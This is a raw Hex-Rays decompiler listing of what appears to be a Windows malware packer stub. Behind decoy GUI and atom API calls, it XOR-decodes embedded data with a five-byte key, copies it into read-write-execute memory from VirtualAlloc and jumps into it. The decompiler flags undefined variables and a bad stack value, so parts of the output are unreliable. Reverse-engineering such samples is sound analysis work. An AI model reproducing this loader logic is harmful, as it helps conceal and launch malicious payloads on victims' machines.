/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

unsigned int __cdecl sub_1310D000(_BYTE *a1, int a2, int a3, _DWORD *a4, unsigned int a5, int a6);
void __noreturn start(); // weak
int sub_1310D5EC();
// BOOL __stdcall ImageList_DragEnter(HWND hwndLock, int x, int y);
// BOOL __stdcall ImageList_Draw(HIMAGELIST himl, int i, HDC hdcDst, int x, int y, UINT fStyle);
// void __stdcall InitCommonControls();
// ATOM __stdcall AddAtomW(LPCWSTR lpString);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// DWORD __stdcall GetLastError();
// void __stdcall __noreturn ExitProcess(UINT uExitCode);


//----- (1310D000) --------------------------------------------------------
unsigned int __cdecl sub_1310D000(_BYTE *a1, int a2, int a3, _DWORD *a4, unsigned int a5, int a6)
{
  unsigned int result; // eax
  int v8; // ebx
  unsigned int v9; // [esp+Ch] [ebp-18h]
  _BYTE *i; // [esp+30h] [ebp+Ch]

  *a4 = a3;
  result = a5 / 5;
  v9 = a5 % 5;
  for ( i = (_BYTE *)(a5 + a2); a3--; ++i )
  {
    AddAtomW((LPCWSTR)0xB8000000);
    v8 = *(unsigned __int8 *)(a6 + (__int16)v9);
    result = v8 ^ (char)*i;
    *a1 = v8 ^ *i;
    LOWORD(v9) = v9 + 1;
    if ( (__int16)v9 == 5 )
      LOWORD(v9) = 0;
    ++a1;
  }
  return result;
}

//----- (1310D0A9) --------------------------------------------------------
void __noreturn start()
{
  BOOL v0; // eax
  int v1; // edx
  unsigned int v2; // [esp-Ch] [ebp-2E0h]
  unsigned int v3; // [esp+14h] [ebp-2C0h]
  unsigned int v4; // [esp+74h] [ebp-260h]
  _BYTE *v5; // [esp+78h] [ebp-25Ch]
  int v6; // [esp+7Ch] [ebp-258h] BYREF
  int v7[3]; // [esp+80h] [ebp-254h] BYREF
  unsigned int v8; // [esp+8Ch] [ebp-248h]
  _BYTE *v9; // [esp+90h] [ebp-244h] BYREF
  unsigned int v10; // [esp+94h] [ebp-240h]
  _DWORD *v11; // [esp+98h] [ebp-23Ch]
  int v12; // [esp+9Ch] [ebp-238h] BYREF
  int v13; // [esp+A0h] [ebp-234h] BYREF
  char v14; // [esp+A4h] [ebp-230h] BYREF
  int v15; // [esp+A5h] [ebp-22Fh]
  unsigned int v16; // [esp+2ACh] [ebp-28h]
  void **v17; // [esp+2B0h] [ebp-24h] BYREF
  int *v18; // [esp+2B4h] [ebp-20h]
  int v19; // [esp+2B8h] [ebp-1Ch]
  _BYTE *v20; // [esp+2BCh] [ebp-18h] BYREF
  int v21; // [esp+2C0h] [ebp-14h]
  int v22; // [esp+2C4h] [ebp-10h] BYREF
  int v23; // [esp+2C8h] [ebp-Ch] BYREF
  _BYTE *v24; // [esp+2CCh] [ebp-8h]
  int v25; // [esp+2D0h] [ebp-4h]
  void *retaddr; // [esp+2D8h] [ebp+4h] BYREF

  InitCommonControls();
  GetLastError();
  ImageList_DragEnter((HWND)0xBD0000, 178257920, 616);
  AddAtomW((LPCWSTR)0x80000);
  v0 = ImageList_Draw((HIMAGELIST)0x234000, 4587520, (HDC)0x40000000, 146432, 876544, 0x3F400u);
  v3 = (v1 + v0) ^ 0x800401F0;
  v14 = 109;
  v15 = 731325884;
  v11 = (_DWORD *)(v3 - 1827872438);
  v12 = *(_DWORD *)(v3 - 1827872438);
  if ( v3 != -2147221008 )
    v2 = 0;
  sub_1310D000(&v12, (int)&v12, 4, &v23, v2, 0);
  v17 = &retaddr;
  v7[0] = v11[1];
  sub_1310D000(v7, (int)&v6, 4, &v23, 4u, (int)&v14);
  v22 = v11[2];
  sub_1310D000(&v22, (int)&v20, 4, &v23, 8u, (int)&v14);
  v18 = v11 + 3;
  v19 = 319815680;
  v7[1] = 319819776;
  v8 = 12;
  v20 = (_BYTE *)v11[3];
  sub_1310D000(&v20, (int)&v17, 4, &v23, 0xCu, (int)&v14);
  v20 += v19;
  v8 += 4;
  v9 = (_BYTE *)*++v18;
  sub_1310D000(&v9, (int)&(&v9)[v8 / 0xFFFFFFFC], 4, &v23, v8, (int)&v14);
  v8 += 4;
  ++v18;
  v16 = 8 * v22 + 12;
  v5 = VirtualAlloc((LPVOID)(v3 + 2147221008), v12 + v7[0] + v16, 0x3000u, 0x40u);
  v24 = &v20[v16];
  v10 = v16;
  v4 = v16;
  v25 = 0;
  v21 = 0;
  while ( 1 )
  {
    if ( (_BYTE *)v4 == v9 )
    {
      if ( ++v25 == v22 )
      {
        sub_1310D000(v5, (int)&v5[-v16], v7[0], &v13, v16, (int)&v14);
        ((void (__cdecl *)(_BYTE *, _BYTE *, int, int, char *, void **, char *))(v5 + 3920))(
          &v5[v7[0]],
          v5,
          v12,
          v7[0],
          &v14,
          v17,
          &v14);
        ExitProcess(0);
      }
      v20 = (_BYTE *)*v18;
      sub_1310D000(&v20, (int)&(&v20)[v8 / 0xFFFFFFFC], 4, &v23, v8, (int)&v14);
      v20 += v19;
      v8 += 4;
      v9 = (_BYTE *)*++v18;
      sub_1310D000(&v9, (int)&(&v9)[v8 / 0xFFFFFFFC], 4, &v23, v8, (int)&v14);
      v8 += 4;
      ++v18;
      v4 = 0;
      v24 = v20;
    }
    v5[v21++] = *v24++;
    ++v4;
    ++v10;
  }
}
// 1310D104: variable 'v1' is possibly undefined
// 1310D170: variable 'v2' is possibly undefined
// 1310D0A9: using guessed type void __noreturn start();

//----- (1310D5EC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_1310D5EC()
{
  return 0;
}
// 1310D5F3: positive sp value 4 has been found

// nfuncs=3 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
// ALL OK, 3 function(s) have been successfully decompiled
